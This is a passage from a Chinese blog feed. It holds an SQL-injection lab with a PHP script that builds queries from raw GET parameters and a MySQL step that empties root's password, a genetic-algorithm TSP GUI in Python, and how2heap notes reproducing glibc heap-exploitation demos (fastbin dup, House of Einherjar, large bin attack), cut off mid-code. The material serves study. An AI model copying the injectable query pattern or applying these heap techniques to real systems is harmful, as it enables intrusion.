语句并执行，更新数据库。如输入学号和分数，将对应学生的分数更新。代码： &lt;?php $connect=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;,&quot;test&quot;); function SearchId($id){ global $connect; $sql=&quot;SELECT * FROM student WHERE id=&quot;.$id; $result=mysqli_query($connect,$sql); $row=mysqli_fetch_assoc($result); if($row){ return $row[&quot;score&quot;]; }else{ return &quot;error&quot;; } } $id=$_GET[&apos;id&apos;]; echo &quot;id:&quot;.$id.&quot;&lt;/br&gt;&quot;; $Oldscore=SearchId($id); echo &quot;Old score:&quot;.$Oldscore.&quot;&lt;/br&gt;&quot;; $sqlN=&quot;UPDATE student SET score=&quot;.$_GET[&apos;score&apos;].&quot; WHERE id=&quot;.$id; //echo $sqlN.&quot;&lt;/br&gt;&quot;; echo &quot;New score:&quot;.$_GET[&apos;score&apos;].&quot;&lt;/br&gt;&quot;; mysqli_query($connect,$sqlN); $Nowscore=SearchId($id); echo &quot;Now score:&quot;.$Nowscore.&quot;&lt;/br&gt;&quot;; ?&gt; 运行结果：对更改后的ID=1的student进行判断score是否大于60的注入结果： 实验遇到的问题：1.在网页运行php文件的时候，总显示让我下载文件，而不是运行这个文件。这是因为 /etc/nginx/sites-available/default文件中有一部分代码在初始化的时候被注释掉了。2.SQL注入的时候连接数据库会出现什么也不显示。排查错误后找到错误信息为 ERROR 1698 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; 发现是我的数据库连接有问题，这是由于Ubuntu安装中，MySQL默认使用了UNIX auth_socket plugin插件。所以当db_users使用数据库时，将会通过系统用户认证表进行认证。解决方法： mysql&gt; USE mysql; mysql&gt; UPDATE user SET plugin=&apos;mysql_native_password&apos; WHERE User=&apos;root&apos;; mysql&gt; FLUSH PRIVILEGES; mysql&gt; exit; $ service mysql restart 这样把密码清空就解决了这个问题。]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[带GUI的TSP算法]]></title>
    <url>%2F2019%2F05%2F07%2F%E5%B8%A6GUI%E7%9A%84TSPP%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[对上一个TSP算法的优化以及GUI的设计我使用python的tkinter库进行GUI的设计详细请看实验代码实验代码：import tkinter as tk from tkinter import * import random import math import matplotlib.pyplot as plt import numpy as np import time #这两行代码让输出的图形中显示中文 plt.rcParams[&apos;font.sans-serif&apos;]=[&apos;SimHei&apos;] plt.rcParams[&apos;axes.unicode_minus&apos;] =False #减号unicode编码 def initCities(main_cities): cities = [] firstCity=main_cities[0] n=0 file=open(&quot;data.txt&quot;,&quot;r&quot;) for line in file: line = line.replace(&quot;,\n&quot;,&quot; &quot;) line = line.split(&quot;,&quot;) if line[0] in main_cities: cities.append([n,float(line[1]),float(line[2]),line[0]] ) n+=1 n=0 for i in cities: i=list(i) n+=1 if i[3] == firstCity: cities[0][0]=n-1 cities[n-1][0]=0 cities = [x for x in sorted(cities)] #返回城市列表 return cities windows = tk.Tk() windows.title(&quot;TSP&quot;) windows.geometry(&apos;800x600&apos;) text=tk.Text(windows,height=15,width=30) text.place(x=10,y=300,anchor=&apos;nw&apos;) #定义一个city列表用来保存输入的city list_cities=[] allCities=[&apos;北京&apos;,&apos;天津&apos;,&apos;上海&apos;,&apos;重庆&apos;,&apos;拉萨&apos;,&apos;乌鲁木齐&apos;,&apos;银川&apos;,&apos;呼和浩特&apos;,&apos;南宁&apos;,&apos;哈尔滨&apos;,&apos;长春&apos;,&apos;沈阳&apos;,&apos;石家庄&apos;,&apos;太原&apos;,&apos;西宁&apos;,&apos;济南&apos;,&apos;郑州&apos;,&apos;南京&apos;,&apos;合肥&apos;,&apos;杭州&apos;,&apos;福州&apos;,&apos;兰州&apos;,&apos;南昌&apos;,&apos;长沙&apos;,&apos;武汉&apos;,&apos;广州&apos;,&apos;台北&apos;,&apos;海口&apos;,&apos;西安&apos;,&apos;成都&apos;,&apos;贵阳&apos;,&apos;昆明&apos;,&apos;香港&apos;,&apos;澳门&apos;] def insert_City(city): if city not in list_cities: list_cities.append(city) text.insert(INSERT,city+&apos; &apos;) else : list_cities.remove(city) text.insert(INSERT,&quot;(将%s从城市列表删除)&quot;%city+&apos; &apos;) def insert_all(): for i in allCities: if i not in list_cities: list_cities.append(i) text.insert(INSERT,i+&apos; &apos;) city01= tk.Button(windows, text=&quot;北京&quot;, width=3, height=1,command=lambda:insert_City(&quot;北京&quot;)) city01.place(x=10,y=1,anchor=&apos;nw&apos;) city02= tk.Button(windows, text=&quot;天津&quot;, width=3, height=1,command=lambda:insert_City(&quot;天津&quot;)) city02.place(x=45,y=1,anchor=&apos;nw&apos;) city03= tk.Button(windows, text=&quot;上海&quot;, width=3, height=1,command=lambda:insert_City(&quot;上海&quot;)) city03.place(x=80,y=1,anchor=&apos;nw&apos;) city04= tk.Button(windows, text=&quot;重庆&quot;, width=3, height=1,command=lambda:insert_City(&quot;重庆&quot;)) city04.place(x=115,y=1,anchor=&apos;nw&apos;) city05= tk.Button(windows, text=&quot;拉萨&quot;, width=3, height=1,command=lambda:insert_City(&quot;拉萨&quot;)) city05.place(x=150,y=1,anchor=&apos;nw&apos;) city06= tk.Button(windows, text=&quot;银川&quot;, width=3, height=1,command=lambda:insert_City(&quot;银川&quot;)) city06.place(x=185,y=1,anchor=&apos;nw&apos;) city07= tk.Button(windows, text=&quot;南宁&quot;, width=3, height=1,command=lambda:insert_City(&quot;南宁&quot;)) city07.place(x=10,y=30,anchor=&apos;nw&apos;) city08= tk.Button(windows, text=&quot;长春&quot;, width=3, height=1,command=lambda:insert_City(&quot;长春&quot;)) city08.place(x=45,y=30,anchor=&apos;nw&apos;) city09= tk.Button(windows, text=&quot;沈阳&quot;, width=3, height=1,command=lambda:insert_City(&quot;沈阳&quot;)) city09.place(x=80,y=30,anchor=&apos;nw&apos;) city10= tk.Button(windows, text=&quot;太原&quot;, width=3, height=1,command=lambda:insert_City(&quot;太原&quot;)) city10.place(x=115,y=30,anchor=&apos;nw&apos;) city11= tk.Button(windows, text=&quot;西宁&quot;, width=3, height=1,command=lambda:insert_City(&quot;西宁&quot;)) city11.place(x=150,y=30, anchor=&apos;nw&apos;) city12= tk.Button(windows, text=&quot;济南&quot;, width=3, height=1,command=lambda:insert_City(&quot;济南&quot;)) city12.place(x=185,y=30,anchor=&apos;nw&apos;) city13= tk.Button(windows, text=&quot;郑州&quot;, width=3, height=1,command=lambda:insert_City(&quot;郑州&quot;)) city13.place(x=10,y=60,anchor=&apos;nw&apos;) city14= tk.Button(windows, text=&quot;南京&quot;, width=3, height=1,command=lambda:insert_City(&quot;南京&quot;)) city14.place(x=45,y=60,anchor=&apos;nw&apos;) city15= tk.Button(windows, text=&quot;合肥&quot;, width=3, height=1,command=lambda:insert_City(&quot;合肥&quot;)) city15.place(x=80,y=60,anchor=&apos;nw&apos;) city16= tk.Button(windows, text=&quot;杭州&quot;, width=3, height=1,command=lambda:insert_City(&quot;杭州&quot;)) city16.place(x=115,y=60,anchor=&apos;nw&apos;) city17= tk.Button(windows, text=&quot;福州&quot;, width=3, height=1,command=lambda:insert_City(&quot;福州&quot;)) city17.place(x=150,y=60,anchor=&apos;nw&apos;) city18= tk.Button(windows, text=&quot;长沙&quot;, width=3, height=1,command=lambda:insert_City(&quot;长沙&quot;)) city18.place(x=185,y=60,anchor=&apos;nw&apos;) city19= tk.Button(windows, text=&quot;武汉&quot;, width=3, height=1,command=lambda:insert_City(&quot;武汉&quot;)) city19.place(x=10,y=90,anchor=&apos;nw&apos;) city20= tk.Button(windows, text=&quot;广州&quot;, width=3, height=1,command=lambda:insert_City(&quot;广州&quot;)) city20.place(x=45,y=90,anchor=&apos;nw&apos;) city21= tk.Button(windows, text=&quot;台北&quot;, width=3, height=1,command=lambda:insert_City(&quot;台北&quot;)) city21.place(x=80,y=90,anchor=&apos;nw&apos;) city22= tk.Button(windows, text=&quot;海口&quot;, width=3, height=1,command=lambda:insert_City(&quot;海口&quot;)) city22.place(x=115,y=90,anchor=&apos;nw&apos;) city23= tk.Button(windows, text=&quot;兰州&quot;, width=3, height=1,command=lambda:insert_City(&quot;兰州&quot;)) city23.place(x=150,y=90,anchor=&apos;nw&apos;) city24= tk.Button(windows, text=&quot;西安&quot;, width=3, height=1,command=lambda:insert_City(&quot;西安&quot;)) city24.place(x=185,y=90,anchor=&apos;nw&apos;) city25= tk.Button(windows, text=&quot;呼和浩特&quot;, width=8, height=1,command=lambda:insert_City(&quot;呼和浩特&quot;)) city25.place(x=10,y=120,anchor=&apos;nw&apos;) city26= tk.Button(windows, text=&quot;乌鲁木齐&quot;, width=8, height=1,command=lambda:insert_City(&quot;乌鲁木齐&quot;)) city26.place(x=80,y=120,anchor=&apos;nw&apos;) city27= tk.Button(windows, text=&quot;成都&quot;, width=3, height=1,command=lambda:insert_City(&quot;成都&quot;)) city27.place(x=150,y=120,anchor=&apos;nw&apos;) city28= tk.Button(windows, text=&quot;贵阳&quot;, width=3, height=1,command=lambda:insert_City(&quot;贵阳&quot;)) city28.place(x=185,y=120,anchor=&apos;nw&apos;) city29= tk.Button(windows, text=&quot;哈尔滨&quot;, width=8, height=1,command=lambda:insert_City(&quot;哈尔滨&quot;)) city29.place(x=10,y=150,anchor=&apos;nw&apos;) city30= tk.Button(windows, text=&quot;石家庄&quot;, width=8, height=1,command=lambda:insert_City(&quot;石家庄&quot;)) city30.place(x=80,y=150,anchor=&apos;nw&apos;) city31= tk.Button(windows, text=&quot;昆明&quot;, width=3, height=1,command=lambda:insert_City(&quot;昆明&quot;)) city31.place(x=150,y=150,anchor=&apos;nw&apos;) city32= tk.Button(windows, text=&quot;南昌&quot;, width=3, height=1,command=lambda:insert_City(&quot;南昌&quot;)) city32.place(x=185,y=150,anchor=&apos;nw&apos;) city33= tk.Button(windows, text=&quot;澳门&quot;, width=8, height=1,command=lambda:insert_City(&quot;澳门&quot;)) city33.place(x=10,y=180,anchor=&apos;nw&apos;) city34= tk.Button(windows, text=&quot;香港&quot;, width=8, height=1,command=lambda:insert_City(&quot;香港&quot;)) city34.place(x=80,y=180,anchor=&apos;nw&apos;) city35= tk.Button(windows, text=&quot;全选&quot;, width=8, height=1,command=insert_all) city35.place(x=150,y=180,anchor=&apos;nw&apos;) label1 = tk.Label(windows, text=&apos;第一个点击的是首发城市&apos;) label1.place(x=10,y=210,anchor=&apos;nw&apos;) label2 = tk.Label(windows, text=&apos;继续点击就把其他城市添加到你想去的地方&apos;) label2.place(x=10,y=240,anchor=&apos;nw&apos;) label3 = tk.Label(windows, text=&apos;输入的城市&apos;) label3.place(x=80,y=270,anchor=&apos;nw&apos;) label4 = tk.Label(windows, text=&apos;输入遍历次数&apos;) label4.place(x=250,y=1,anchor=&apos;nw&apos;) label5 = tk.Label(windows, text=&apos;输出方案如下&apos;) label5.place(x=500,y=10,anchor=&apos;nw&apos;) defaultNum=0 def inNum(): defaultNum=textIn.get() print(defaultNum) return defaultNum textIn=tk.Entry(windows,width=5) textIn.place(x=250,y=30,anchor=&apos;nw&apos;) city35= tk.Button(windows, text=&quot;确定&quot;, width=3, height=1,command=inNum) city35.place(x=300,y=30,anchor=&apos;nw&apos;) textOut=tk.Text(windows,height=40,width=50) textOut.place(x=350,y=60,anchor=&apos;nw&apos;) def runAll(): defaultNum=int(inNum()) run_flag=defaultNum #求出给定list的总距离 def distance(order): distance = 0.0 for i in range(len(order)-1): num1, num2 = order[i], order[i + 1] distance += city_distance[num1][num2] distance+=city_distance[num2][0] #返回距离 return distance #初始化种群数 count=300 #设置强者的定义概率，即种群前50%为强者 retain_rate=0.5 #交叉，将所选取的基因交叉 def cross(par1,par2): par1.pop(0) par2.pop(0) #首先选取一个位置 num1 = random.randint(2,len(par1)-1) #选取要交叉的个数 num2 = random.randint(num1,len(par2)-1) crossGene = par2[num1:num2] #判断现在所处的位置 flag = 0 Gene = [] for life in par1: if flag == num1: Gene.extend(crossGene) flag += 1 if life not in crossGene: Gene.append(life) flag += 1 Gene=inserted(Gene) return Gene #变异，随机交换两个城市之间的位置 def mutation(Gene): gene=Gene.copy() num=gene.pop(0) #随机产生两个被交换的地点，并交换位置 num1 = random.randint(1, len(gene)-1) num2 = random.randint(1, len(gene)-1) gene[num1],gene[num2] = gene[num2],gene[num1] gene=inserted(gene) if gene[0]&lt;Gene[0]: return gene else: return Gene #物竞天择，弱者死亡 #弱者三分之二死亡 def dellist(lives): num=int(retain_rate*len(lives)) for i in range(num,len(lives)-1): flag=random.randrange(0,3,1) if flag&lt;2: del lives[num-1] return lives #将距离插入lives中 def inserted(i): i.insert(0,distance(i)) return i #自然选择算法 def nature(lives): #初始化变异次数 var_time=0 #设置有效变异次数 valid_time=0 #初始化交叉次数（也就是一共产生多少次子代） cro_time=0 newlives1=[] newlives2=lives[0] breaktime=0 #一共进化1000次,但是如果在进化多次后最优解仍然不变的时候就直接break,但是为了保证进化的程度很好要保证在500次以上 for time in range(1500): #print(lives) if time == 0: for i in lives: if i != None: newlives1.append(inserted(i)) lives=[] newlives1=[x for x in sorted(newlives1)] if newlives1[0][0]==newlives2[0]: breaktime += 1 else : breaktime = 0 newlives2=newlives1[0] if breaktime &gt; 100 &amp; time &gt;= 500:#当已经遗传到了500代之后并且有100个连续相同的最优解产生的时候进行break break #print(newlives1) #newlives1.reverse() newlives1=dellist(newlives1) num=count-len(newlives1) while num &gt; 0: #在newlives1中随机选取两个进行交叉最优的不进行 a=random.randrange(1,len(newlives1),1) b=random.randrange(1,len(newlives1),1) if a!=b : par1=newlives1[a].copy() par2=newlives1[b].copy() life=cross(par1,par2) cro_time += 1 #对交叉生成的子代进行变异(0.5的概率) flag=random.randrange(0,2,1) if flag==1: #如果产生的子代变异后没有原来的好就保存原来的 newlives1.append(mutation(life)) var_time+=1 else: newlives1.append(life) if newlives1[-1][0]&lt;newlives2[0]: valid_time+=1 num-=1 #print(newlives1) print(&quot;遗传次数：&quot;+str(time+1)) print(&quot;交叉次数：&quot;+str(cro_time)) print(&quot;变异次数：&quot;+str(var_time)) print(&quot;有效次数：&quot;+str(valid_time)) return newlives1 bestList=[] while defaultNum&gt;0: #运行程序 cities=initCities(list_cities) geneLength=len(cities) #生成距离矩阵city_distance，方便调用 city_distance=np.zeros([geneLength,geneLength]) for i in range(geneLength): for j in range(geneLength): city_distance[i][j]=math.sqrt((cities[i][1] - cities[j][1]) ** 2 +(cities[i][2] - cities[j][2]) ** 2) #随机产生300个city队列（种群数量为300） lives=[] for i in range(count): aGene = [ x for x in range(1,geneLength) ] random.shuffle(aGene) aGene.insert(0,0) #第一个位置永远是0，表示开始的位置 lives.append(aGene) #计算算法运行时间 start = time.time() lives=nature(lives) end = time.time() print(&quot;运行时间：&quot;+str(end-start)+&quot;s&quot;) defaultNum -= 1 if lives[0] not in bestList: bestList.append(lives[0]) if lives[1] not in bestList: bestList.append(lives[1]) if lives[2] not in bestList: bestList.append(lives[2]) bestList=[x for x in sorted(bestList)] n=0#定义输出的第几个方案 for lives in bestList: if (lives[0]-bestList[0][0]&lt;10) &amp; (n&lt;=run_flag): n+=1 list=[] #将cities按照lives的顺序排列 for i in lives[1:]: for j in cities: if j[0]==i: list.append(j) textOut.insert(INSERT,&quot;方案%d：&quot;%n+&quot;\n&quot;+&quot;Distance=&quot;+str(lives[0])+&quot;\n&quot;) #print(&quot;Distance=&quot;+str(lives[0][0])) #print(&quot;遍历顺序为：&quot;) textOut.insert(INSERT,&quot;遍历顺序为：&quot;) for city in list: #print(city[3],end=&quot; &quot;) textOut.insert(INSERT,city[3]+&quot; &quot;) #print(list[0][3]) textOut.insert(INSERT,list[0][3]+&quot;\n&quot;) p1=[] p2=[] p3=[] for i in list: p1.append(i[1]) p2.append(i[2]) p3.append(i[3]) p1.append(list[0][1]) p2.append(list[0][2]) plt.figure(&apos;Draw&apos;) plt.plot(p1,p2) # plot绘制折线图 for i in range(len(p1)-1): plt.text(p1[i],p2[i],p3[i]) #显示绘图 plt.draw() #显示1秒 plt.pause(1) #保存图象 plt.savefig(&quot;demo%d.png&quot;%n) textOut.insert(INSERT,&quot;图片存储位置为：&quot;+&quot;demo%d.png&quot;%n+&quot;\n\n&quot;) plt.close() but=tk.Button(windows,text=&quot;运行&quot;,width=8,height=3,command=runAll) but.place(x=250,y=80) windows.mainloop() 运行效果图： 所给的data.txt文件如下北京,116.46,39.92 天津,117.2,39.13 上海,121.48,31.22 重庆,106.54,29.59 拉萨,91.11,29.97 乌鲁木齐,87.68,43.77 银川,106.27,38.47 呼和浩特,111.65,40.82 南宁,108.33,22.84 哈尔滨,126.63,45.75 长春,125.35,43.88 沈阳,123.38,41.8 石家庄,114.48,38.03 太原,112.53,37.87 西宁,101.74,36.56 济南,117,36.65 郑州,113.6,34.76 南京,118.78,32.04 合肥,117.27,31.86 杭州,120.19,30.26 福州,119.3,26.08 南昌,115.89,28.68 长沙,113,28.21 武汉,114.31,30.52 广州,113.23,23.16 台北,121.5,25.05 海口,110.35,20.02 兰州,103.73,36.03 西安,108.95,34.27 成都,104.06,30.67 贵阳,106.71,26.57 昆明,102.73,25.04 香港,114.1,22.2 澳门,113.33,22.13]]></content>
      <tags>
        <tag>python</tag>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[how2heap学习笔记（一）]]></title>
    <url>%2F2019%2F05%2F06%2Fhow2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[how2heap的学习1.fastbin_dup_consolidate.c代码：#include &lt;stdio.h&gt; #include &lt;stdint.h&gt; #include &lt;stdlib.h&gt; int main() { void* p1 = malloc(0x40); void* p2 = malloc(0x40); fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\n&quot;, p1, p2); fprintf(stderr, &quot;Now free p1!\n&quot;); free(p1); void* p3 = malloc(0x400); fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;, p3); fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;); free(p1); fprintf(stderr, &quot;Trigger the double free vulnerability!\n&quot;); fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;); fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: %p %p\n&quot;, malloc(0x40), malloc(0x40)); } 运行结果： 分析：首先看代码，先申请了两个fastbin分别为p1和p2，然后释放了一个p1，将其加入fastbins中。再申请了一个0x400的largebin去触发漏洞，这是由于在申请largebin的时候会首先根据 chunk 的大小获得对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果有，调用 malloc_consolidate() 函数合并 fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回 small bins 或 large bins 中。这个时候我们就可以再次释放 p1。（这是由于p1不是fast top，所以p1可以被释放）这个时候，我们既有fastbins中的 chunk p1 也有small bins 的chunk p2。我们可以malloc两次，第一次从fastbins取出，第二次从small bins中取出。且这两块新 chunk 处于同一个位置。 2.fastbin_dup_into_stack.c代码：#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { fprintf(stderr, &quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot; &quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;); unsigned long long stack_var; fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, 8+(char *)&amp;stack_var); fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a); fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b); fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c); fprintf(stderr, &quot;Freeing the first one...\n&quot;); free(a); fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a); // free(a); fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b); free(b); fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. &quot; &quot;We&apos;ll now carry out our attack by modifying data at %p.\n&quot;, a, b, a, a); unsigned long long *d = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, d); fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8)); fprintf(stderr, &quot;Now the free list has [ %p ].\n&quot;, a); fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\n&quot; &quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot; &quot;so that malloc will think there is a free chunk there and agree to\n&quot; &quot;return a pointer to it.\n&quot;, a); stack_var = 0x20; fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a); *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8)); 运行结果: 实验分析：首先建立了三个内存为8的chunk分别为a,b,c，然后释放a，这时候a是顶部所以不能再次释放，而当释放了b后，a就不是顶了就可以释放了。在这个程序中，通过free操作，生成了一个freelist。再使用malloc生成chunk d，这个时候就会从fastbin中取出一个，因为栈是LIFO（也就是后进先出），所以chunk A会被取出，如果我们这个时候能对 chunk D 进行操作，如 d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); 由于 stack_var = 0x20;这样的定义是在函数内，所以stack_var的地址将在栈上，通过对指针 d 的操作，我们可以伪造一个 chunk ，并将这个 chunk 放在栈上。在这之后malloc就会认为存在这么一个free-chunk,并在之后的内存申请中返回这个地址。这个时候，我们既有fastbins中的 chunk p1 也有small bins 的chunk p2。我们可以malloc两次，第一次从fastbins取出，第二次从small bins中取出。且这两块新 chunk 处于同一个位置。 3.house_of_einherjar.c代码：#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; /* Credit to st4g3r for publishing this technique The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc() This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. */ int main() { fprintf(stderr, &quot;Welcome to House of Einherjar!\n&quot;); fprintf(stderr, &quot;Tested in Ubuntu 16.04 64bit.\n&quot;); fprintf(stderr, &quot;This technique can be used when you have an off-by-one into a malloc&apos;ed region with a null byte.\n&quot;); uint8_t* a; uint8_t* b; uint8_t* d; fprintf(stderr, &quot;\nWe allocate 0x38 bytes for &apos;a&apos;\n&quot;); a = (uint8_t*) malloc(0x38); fprintf(stderr, &quot;a: %p\n&quot;, a); int real_a_size = malloc_usable_size(a); fprintf(stderr, &quot;Since we want to overflow &apos;a&apos;, we need the &apos;real&apos; size of &apos;a&apos; after rounding: %#x\n&quot;, real_a_size); // create a fake chunk fprintf(stderr, &quot;\nWe create a fake chunk wherever we want, in this case we&apos;ll create the chunk on the stack\n&quot;); fprintf(stderr, &quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;); fprintf(stderr, &quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;); fprintf(stderr, &quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;); size_t fake_chunk[6]; fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk&apos;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin fake_chunk[2] = (size_t) fake_chunk; // fwd fake_chunk[3] = (size_t) fake_chunk; // bck fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize fprintf(stderr, &quot;Our fake chunk at %p looks like:\n&quot;, fake_chunk); fprintf(stderr, &quot;prev_size (not used): %#lx\n&quot;, fake_chunk[0]); fprintf(stderr, &quot;size: %#lx\n&quot;, fake_chunk[1]); fprintf(stderr, &quot;fwd: %#lx\n&quot;, fake_chunk[2]); fprintf(stderr, &quot;bck: %#lx\n&quot;, fake_chunk[3]); fprintf(stderr, &quot;fwd_nextsize: %#lx\n&quot;, fake_chunk[4]); fprintf(stderr, &quot;bck_nextsize: %#lx\n&quot;, fake_chunk[5]); b = (uint8_t*) malloc(0xf8); int real_b_size = malloc_usable_size(b); fprintf(stderr, &quot;\nWe allocate 0xf8 bytes for &apos;b&apos;.\n&quot;); fprintf(stderr, &quot;b: %p\n&quot;, b); uint64_t* b_size_ptr = (uint64_t*)(b - 8); /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/ fprintf(stderr, &quot;\nb.size: %#lx\n&quot;, *b_size_ptr); fprintf(stderr, &quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;); fprintf(stderr, &quot;We overflow &apos;a&apos; with a single null byte into the metadata of &apos;b&apos;\n&quot;); a[real_a_size] = 0; fprintf(stderr, &quot;b.size: %#lx\n&quot;, *b_size_ptr); fprintf(stderr, &quot;This is easiest if b.size is a multiple of 0x100 so you &quot; &quot;don&apos;t change the size of b, only its prev_inuse bit\n&quot;); fprintf(stderr, &quot;If it had been modified, we would need a fake chunk inside &quot; &quot;b where it will try to consolidate the next chunk\n&quot;); // Write a fake prev_size to the end of a fprintf(stderr, &quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot; &quot;it will consolidate with our fake chunk\n&quot;, sizeof(size_t)); size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk); fprintf(stderr, &quot;Our fake prev_size will be %p - %p = %#lx\n&quot;, b-sizeof(size_t)*2, fake_chunk, fake_size); *(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size; //Change the fake chunk&apos;s size to reflect b&apos;s new prev_size fprintf(stderr, &quot;\nModify fake chunk&apos;s size to reflect b&apos;s new prev_size\n&quot;); fake_chunk[1] = fake_size; // free b and it will consolidate with our fake chunk fprintf(stderr, &quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;); free(b); fprintf(stderr, &quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;, fake_chunk[1]); //if we allocate another chunk before we free b we will need to fprintf(stderr, &quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;); d = malloc(0x200); fprintf(stderr, &quot;Next malloc(0x200) is at %p\n&quot;, d); } 运行结果： 实验分析：首先malloc一个a，然后利用malloc_usable_size函数求出a的实际的大小。我们可以在任何位置去创建一个假的块，包含块的fwd,bckfwd_nextsize以及bck_nextsize，这个实例中是在堆栈上创建的块。然后再malloc一个b，由于b的size是0x100的整数倍，所以您不需要更改b的大小，只需要更改它的prev_inuse位。如果b的大小被修改，我们就要在b的内部放一个fake chunk 这样才能合并这个chunk。我们将假的prev_size写入到a的最后8个字节，这样能将假块合并。更改假块的大小用来反映b的新prev_size，然后free（b），这样b就可以与我们的假块结合在一起了。最后我们调用malloc生成一个chunk，这个chunk的地址从我们的fake chunk的地址开始。 4.large_bin_attack.c代码：#include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; int main() { fprintf(stderr, &quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;); fprintf(stderr, &quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot; &quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;); unsigned long stack_var1 = 0; unsigned long stack_var2 = 0; fprintf(stderr, &quot;Let&apos;s first look at the targets we want to rewrite on stack:\n&quot;); fprintf(stderr, &quot;stack_var1 (%p): %ld\n&quot;, &amp;stack_var1, stack_var1); fprintf(stderr, &quot;stack_var2 (%p): %ld\n\n&quot;, &amp;stack_var2, stack_var2); unsigned long *p1 = malloc(0x320); fprintf(stderr, &quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;, p1 - 2); fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot; &quot; the first large chunk during the free()\n\n&quot;); malloc(0x20); unsigned long *p2 = malloc(0x400); fprintf(stderr, &quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;, p2 - 2); fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot; &quot; the second large chunk during the free()\n\n&quot;); malloc(0x20); unsigned long *p3 = malloc(0x400); fprintf(stderr, &quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;, p3 - 2); fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot; &quot; the third large chunk during the free()\n\n&quot;); malloc(0x20); free(p1); free(p2); fprintf(stderr, &quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot; &quot; [ %p &lt;--&gt; %p ]\n\n&quot;, (void *)(p2 - 2), (void *)(p2[0])); malloc(0x90); fprintf(stderr, &quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot; &quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot; &quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot; &quot; [ %p ]\n\n&quot;, (void *)((char *)p1 + 0x90)); free(p3); fprintf(stderr, &quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot; &quot; [ %p &lt;--&gt; %p ]\n\n&quot;, (void *)(p3 - 2), (void *)(p3[0])); //------------VULNERABILITY----------- fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the freed second large chunk&apos;s \&quot;size\&quot;&quot; &quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;); fprintf(stderr, &quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot; &quot; at the head of the large bin 